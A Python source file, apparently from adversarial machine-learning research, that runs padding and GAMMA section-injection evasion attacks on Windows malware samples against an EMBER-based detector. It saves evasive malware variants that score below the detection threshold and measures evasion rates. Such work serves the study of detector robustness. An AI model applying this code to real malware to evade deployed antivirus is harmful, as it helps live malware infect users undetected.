import multiprocessing
import os
from functools import partial

import numpy as np
from secml.array import CArray
from secml_malware.attack.blackbox.c_black_box_padding_evasion import (
    CBlackBoxPaddingEvasionProblem,
)
from secml_malware.attack.blackbox.c_gamma_sections_evasion import (
    CGammaSectionsEvasionProblem,
)
from secml_malware.attack.blackbox.c_wrapper_phi import CEmberWrapperPhi
import secml_malware.models.c_classifier_ember as ember
from secml_malware.attack.blackbox.ga.c_base_genetic_engine import CGeneticAlgorithm


os.environ["OMP_NUM_THREADS"] = "1"
os.environ["MKL_NUM_THREADS"] = "1"
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["NUMEXPR_NUM_THREADS"] = "1"


# Example paths — replace these with the actual folders used in your setup.
DEFAULT_GOODWARE_FOLDER = "data/goodware/windows_samples"
DEFAULT_ADV_FOLDER = "data/adversarial_examples"


class OpenGbdt:
    """Wrapper around an EMBER-based classifier that runs black-box evasion
    attacks (padding and GAMMA section injection) and evaluates their success."""

    def __init__(self, model_path: str):
        if model_path is None:
            raise ValueError("model_path cannot be None")
        self.classifier = CEmberWrapperPhi(ember.CClassifierEmber(model_path))
        self.threshold = 0.82

    def padding_attack_single(
        self,
        malware_sample_path: str,
        bytes_to_append: int,
        adv_folder: str = DEFAULT_ADV_FOLDER,
    ):
        """Run a padding evasion attack on a single malware sample."""
        attack = CBlackBoxPaddingEvasionProblem(
            self.classifier,
            population_size=10,
            how_many_padding_bytes=bytes_to_append,
            iterations=50,
        )
        engine = CGeneticAlgorithm(attack)

        with open(malware_sample_path, "rb") as f:
            malware_bytes = f.read()
        malware_sample = CArray(np.frombuffer(malware_bytes, dtype=np.uint8)).atleast_2d()

        _, adv_score, adv_ds, _ = engine.run(malware_sample, CArray([1]))
        adv_score = adv_score[-1]

        malware_hash = os.path.basename(malware_sample_path)
        if adv_score < self.threshold:
            print(f"Success! Score: {adv_score}")
            adv_example = adv_ds.X[0, :]
            output_dir = os.path.join(adv_folder, str(bytes_to_append))
            os.makedirs(output_dir, exist_ok=True)
            print(f"Saving file {malware_hash}_adv")
            engine.write_adv_to_file(
                adv_example, os.path.join(output_dir, malware_hash + "_adv")
            )
        else:
            print(f"Failed! Score: {adv_score}")

    def gamma_section_injection(
        self,
        malware_sample_path: str,
        adv_folder: str = DEFAULT_ADV_FOLDER,
        goodware_folder: str = DEFAULT_GOODWARE_FOLDER,
    ):
        """Run a GAMMA section-injection evasion attack on a single malware sample."""
        section_population, _ = CGammaSectionsEvasionProblem.create_section_population_from_folder(
            goodware_folder,
            how_many=50,
            sections_to_extract=[".rdata"],
            to_ignore=[
                "c7c9e072161fe239e3406e5d45b85eef9b1e0795a4f8219032fa14ec765accfe"
            ],
        )
        attack = CGammaSectionsEvasionProblem(
            section_population,
            self.classifier,
            population_size=10,
            penalty_regularizer=1e-7,
            iterations=50,
            threshold=0,
        )
        engine = CGeneticAlgorithm(attack)

        with open(malware_sample_path, "rb") as f:
            malware_bytes = f.read()
        # Kept 2D consistently with padding_attack_single (the original code
        # built a 1D array here, which didn't match the [0, :] indexing below).
        malware_sample = CArray(np.frombuffer(malware_bytes, dtype=np.uint8)).atleast_2d()

        _, adv_score, adv_ds, _ = engine.run(malware_sample, CArray([1]))
        adv_score = adv_score[-1]

        malware_hash = os.path.basename(malware_sample_path)
        if adv_score < self.threshold:
            print(f"Success! Score: {adv_score}")
            adv_example = adv_ds.X[0, :]
            os.makedirs(adv_folder, exist_ok=True)
            print(f"Saving file {malware_hash}_adv")
            engine.write_adv_to_file(
                adv_example, os.path.join(adv_folder, malware_hash + "_adv")
            )
        else:
            print(f"Failed! Score: {adv_score}")

    def multiple_transfer_attack(
        self,
        malware_samples: list,
        adv_folder: str = DEFAULT_ADV_FOLDER,
        bytes_to_append: int = 1536,
        which_attack: str = "gamma",
        goodware_folder: str = DEFAULT_GOODWARE_FOLDER,
    ):
        """Run the selected attack(s) sequentially on a list of malware samples."""
        for i, sample in enumerate(malware_samples):
            print(f"Processing sample {i + 1}/{len(malware_samples)}")
            if not os.path.exists(sample):
                print(f"Sample {sample} does not exist. Skipping.")
                continue
            if which_attack in ("padding", "both"):
                self.padding_attack_single(sample, bytes_to_append, adv_folder)
            if which_attack in ("gamma", "both"):
                self.gamma_section_injection(sample, adv_folder, goodware_folder)

    def mp_transfer_attack(
        self,
        malware_samples: list,
        adv_folder: str = DEFAULT_ADV_FOLDER,
        bytes_to_append: int = 1536,
        n_jobs: int = 4,
        which_attack: str = "gamma",
        goodware_folder: str = DEFAULT_GOODWARE_FOLDER,
    ):
        """Split the sample list into n_jobs chunks and run multiple_transfer_attack
        on each chunk in a separate process."""
        malware_chunks = [malware_samples[i::n_jobs] for i in range(n_jobs)]
        print(
            f"Splitting {len(malware_samples)} samples into {n_jobs} chunks for multiprocessing."
        )

        # The original call only passed malware_chunks to pool.map, silently
        # dropping adv_folder/bytes_to_append/which_attack/goodware_folder.
        # functools.partial binds them so every worker gets the same settings.
        worker = partial(
            self.multiple_transfer_attack,
            adv_folder=adv_folder,
            bytes_to_append=bytes_to_append,
            which_attack=which_attack,
            goodware_folder=goodware_folder,
        )
        with multiprocessing.Pool(processes=n_jobs) as pool:
            pool.map(worker, malware_chunks)

    def test_attacks(self, folder: str, results_path: str):
        """Evaluate how many adversarial samples in `folder` evade the classifier
        (score below self.threshold) and log the results to results_path."""
        samples = os.listdir(folder)
        evaded = 0

        with open(results_path, "a") as results_file:
            for example in samples:
                with open(os.path.join(folder, example), "rb") as f:
                    malware_bytes = f.read()
                malware_sample = CArray(np.frombuffer(malware_bytes, dtype=np.uint8)).atleast_2d()

                _, confidence = self.classifier.predict(
                    malware_sample, return_decision_function=True
                )
                score = confidence[0, 1].item()
                if score < self.threshold:
                    evaded += 1
                    results_file.write(f"{example}, {score}\n")

            summary = f"Evaded {evaded} out of {len(samples)} samples with threshold {self.threshold}."
            print(summary)
            results_file.write(summary + "\n")